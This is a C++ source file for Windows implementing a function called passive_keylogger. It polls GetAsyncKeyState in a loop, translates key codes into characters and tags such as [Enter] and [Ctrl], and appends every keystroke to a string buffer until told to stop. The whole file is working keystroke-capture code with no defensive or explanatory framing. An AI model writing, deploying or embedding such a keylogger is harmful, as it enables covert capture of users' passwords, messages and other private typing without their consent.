#include <windows.h>
#include <fstream>
#include <string>
#include "Keylogger.h"

#pragma warning(disable:4996)

void passive_keylogger(std::string& dump, bool& close) {
	while (1) {
		Sleep(10);
		for (int key = 8; key <= 256; ++key) {
			if (GetAsyncKeyState(key) == -32767) {
				char temp1 = char(key);
				std::string wrkey1 = std::to_string(key);
				switch (temp1)
					{
					case VK_CONTROL:
						wrkey1 += "[Ctrl]";
						break;
					case VK_BACK:
						wrkey1 = "[Back]";
						break;
					case VK_TAB:
						wrkey1 = "[Tab]";
						break;
					case VK_RETURN:
						wrkey1 = "[Enter]";
						break;
					case VK_SHIFT:
						wrkey1 = "[Shift]";
						break;
					case VK_MENU:
						wrkey1 = "[Alt]";
						break;
					case VK_CAPITAL:
						wrkey1 = "[CapsLock]";
						break;
					case VK_ESCAPE:
						wrkey1 = "[Esc]";
						break;
					case VK_SPACE:
						wrkey1 = " ";
						break;
					case VK_PRIOR:
						wrkey1 = "[PageUp]";
						break;
					case VK_NEXT:
						wrkey1 = "[PageDown]";
						break;
					case VK_END:
						wrkey1 = "[End]";
						break;
					case VK_LEFT:
						wrkey1 = "[Left]";
						break;
					case VK_UP:
						wrkey1 = "[Up]";
						break;
					case VK_RIGHT:
						wrkey1 = "[Right]";
						break;
					case VK_DOWN:
						wrkey1 = "[Down]";
						break;
					case VK_SNAPSHOT:
						wrkey1 = "[PrintScreen]";
						break;
					case VK_DELETE:
						wrkey1 = "[Delete]";
						break;

					case 'Q':
						wrkey1 = 'q';
						break;
					case 'W':
						wrkey1 = 'w';
						break;
					case 'E':
						wrkey1 = 'e';
						break;
					case 'R':
						wrkey1 = 'r';
						break;
					case 'T':
						wrkey1 = 't';
						break;
					case 'Y':
						wrkey1 = 'y';
						break;
					case 'U':
						wrkey1 = 'u';
						break;
					case 'I':
						wrkey1 = 'i';
						break;
					case 'O':
						wrkey1 = 'o';
						break;
					case 'P':
						wrkey1 = 'p';
						break;
					case 'A':
						wrkey1 = 'a';
						break;
					case 'S':
						wrkey1 = 's';
						break;
					case 'D':
						wrkey1 = 'd';
						break;
					case 'F':
						wrkey1 = 'f';
						break;
					case 'G':
						wrkey1 = 'g';
						break;
					case 'H':
						wrkey1 = 'h';
						break;
					case 'J':
						wrkey1 = 'j';
						break;
					case 'K':
						wrkey1 = 'k';
						break;
					case 'L':
						wrkey1 = 'l';
						break;
					case 'Z':
						wrkey1 = 'z';
						break;
					case 'X':
						wrkey1 = 'x';
						break;
					case 'C':
						wrkey1 = 'c';
						break;
					case 'V':
						wrkey1 = 'v';
						break;
					case 'B':
						wrkey1 = 'b';
						break;
					case 'N':
						wrkey1 = 'n';
						break;
					case 'M':
						wrkey1 = 'm';
						break;

					case '0':
						wrkey1 = '0';
						break;
					case '1':
						wrkey1 = '1';
						break;
					case '2':
						wrkey1 = '2';
						break;
					case '3':
						wrkey1 = '3';
						break;
					case '4':
						wrkey1 = '4';
						break;
					case '5':
						wrkey1 = '5';
						break;
					case '6':
						wrkey1 = '6';
						break;
					case '7':
						wrkey1 = '7';
						break;
					case '8':
						wrkey1 = '8';
						break;
					case '9':
						wrkey1 = '9';
						break;

					default:
						wrkey1 = ' ';
					}
				dump += wrkey1;
			}
		}
		if (close) break;
	}
}